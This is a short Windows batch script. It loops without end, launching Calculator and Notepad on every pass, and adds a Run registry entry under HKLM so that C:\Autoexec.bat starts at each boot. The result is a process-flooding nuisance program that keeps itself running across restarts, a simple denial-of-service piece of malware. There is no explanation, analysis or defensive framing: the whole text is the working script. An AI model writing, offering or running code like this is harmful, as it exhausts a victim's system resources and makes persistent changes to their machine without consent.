@echo off
cls
:A
start calc.exe
start notepad.exe
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v Autoexec /t reg_sz /d "C:\Autoexec.bat"
goto A